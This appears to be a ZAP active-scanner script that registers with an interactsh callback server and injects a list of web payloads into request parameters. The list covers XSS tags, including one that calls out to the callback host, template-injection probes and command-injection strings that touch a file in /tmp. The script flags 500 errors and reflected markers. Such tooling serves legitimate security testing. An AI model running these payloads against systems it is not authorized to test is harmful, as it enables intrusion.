var Control = Java.type("org.parosproxy.paros.control.Control")
var extOast = Control.getSingleton().getExtensionLoader().getExtension("ExtensionOast")
var interactsh = extOast.getInteractshService()


if (!interactsh.isRegistered()) {
    interactsh.getParam().setServerUrl("https://theping.info")
  // interactsh.getParam().setAuthToken("auth token value")
    interactsh.register()
}

var interactsh_payload = interactsh.getNewPayload();
print("getting an interact token..." + interactsh_payload);


var payloads = [  		"'",
					";",
					"\"",
					"';",
					"\<img src=LovelyJubbly onerror=prompt\(\'RRRRR_PARAM_INT\'\)\>",
					"\<script\>var xhttp=new XMLHttpRequest();xhttp.open(\"GET\", \"https://" + interactsh_payload + "/zap_attack?LovelyJubbly_RRRRR_PARAM_INT\", true);xhttp.send();\</script\>",
					"\"\;-->prompt('LovelyJubbly_RRRRR_PARAM_INT')",
					"{{1/0}}",
					"<%= 1/0 %>",
					"{% LovelyJubbly %}",
					"${7/0}",
					"<img src=http://" + interactsh_payload + " />", 
					"$(touch /tmp/LovelyJubbly)",
					"|| touch /tmp/LovelyJubbly",
					"`touch /tmp/LovelyJubbly`",
					"; touch /tmp/LovelyJubbly"
];

function generateUUID() { // Public Domain/MIT
    var d = new Date().getTime();//Timestamp
    var d2 = ((typeof performance !== 'undefined') && performance.now && (performance.now()*1000)) || 0;//Time in microseconds since page-load or 0 if unsupported
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16;//random number between 0 and 16
        if(d > 0){//Use timestamp until depleted
            r = (d + r)%16 | 0;
            d = Math.floor(d/16);
        } else {//Use microseconds since page-load if supported
            r = (d2 + r)%16 | 0;
            d2 = Math.floor(d2/16);
        }
        return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
    });
}


function replaceTokensInPayloads(payload_in, param_in, msg_in) {
		intRandom = Math.floor((Math.random() * 9999) + 1);
		attack1 = payload_in.replace("INT",intRandom);
		attack1 = attack1.replace("PARAM",param_in);
		if (attack1 == null){
			attack1 = " " 
		} 
			else{
			attack1 = attack1.replace("RRRRR",msg_in.getRequestHeader().getURI().getEscapedPath().toString());
		}
		return attack1;
}

/**
 * Scans a specific parameter in an HTTP message.
 * The scan function will typically be called for every parameter in every URL and Form for every page.
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.  https://javadoc.io/doc/org.zaproxy/zap/latest/org/parosproxy/paros/network/HttpMessage.html
 * @param {string} param - the name of the parameter being manipulated for this test/scan.
 * @param {string} value - the original parameter value.
 */
function scan(as, msg, param, value) {
	for (var i = 0; i < payloads.length; i++) {

		// Debugging can be done using println like this
		print('scan called for url=' + msg.getRequestHeader().getURI().toString() + 
			' param=' + param + ' value=' + value + ' payload=' + payloads[i]);
		// Copy requests before reusing them
		msg = msg.cloneRequest();
          attack1 = replaceTokensInPayloads(payloads[i], param, msg);

		if(msg.getRequestHeader().getMethod() == "GET") {
                try {
	                parsed_json = JSON.parse(value);
	                print(parsed_json);
                     
                     for(var key in parsed_json) {
                           attack2 = replaceTokensInPayloads(payloads[i],  param + "." + key, msg);
				       parsed_json[key] = attack2;
					  newValue = JSON.stringify(parsed_json);
					  encoded = encodeURI(newValue);
                           sendAndReact(as, msg,param, encoded, payloads[i]);
                     }
                     continue
                } catch(error) {
                    // Noop
                }
          }

		sendAndReact(as, msg, param, value + attack1, payloads[i]);

	}
}

function sendAndReact(as, msg, param, value, payload) {
		as.setParam(msg, param, value);
		as.sendAndReceive(msg, false, false);
		var statuscode = msg.getResponseHeader().getStatusCode();
		if (statuscode >= 500) {
			as.newAlert().setRisk(3).setConfidence(2).setParam(param).setName('caused a 500 error').setAttack(payload).setMessage(msg).raise();
		}

		var respBody = msg.getResponseBody().toString();
		if (respBody.indexOf('LovelyJubbly') != -1) {
			as.newAlert().setRisk(3).setConfidence(2).setParam(param).setName('found reflected LovelyJubbly').setAttack(payload).setMessage(msg).raise();
		}
}

